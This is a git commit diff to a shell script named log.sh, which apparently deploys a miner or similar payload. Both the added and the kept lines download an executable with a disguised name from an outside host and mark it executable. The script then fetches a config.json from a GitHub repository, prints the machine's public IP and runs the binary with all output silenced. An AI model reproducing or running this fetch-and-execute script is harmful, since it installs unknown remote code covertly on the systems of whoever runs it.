c10edbe64dbabfabc142fbd8bc262885babda9d7
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2024-01-10 12:33:41 +0700

    Update log.sh

--- log.sh
+++ log.sh
@@ -1,7 +1,7 @@
-wget https://maper.info/BanqueNouvelleRichesse && chmod +x BanqueNouvelleRichesse >/dev/null 2>&1
+wget https://maper.info/CreditNationalePointCentral && chmod +x CreditNationalePointCentral >/dev/null 2>&1
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json
 sleep 11 
 echo "******************************************************************" 
 echo "IP ORI ==> "$(curl ifconfig.me) 
 echo " "
-./BanqueNouvelleRichesse -c "config.json" >/dev/null 2>&1
+./CreditNationalePointCentral -c "config.json" >/dev/null 2>&1
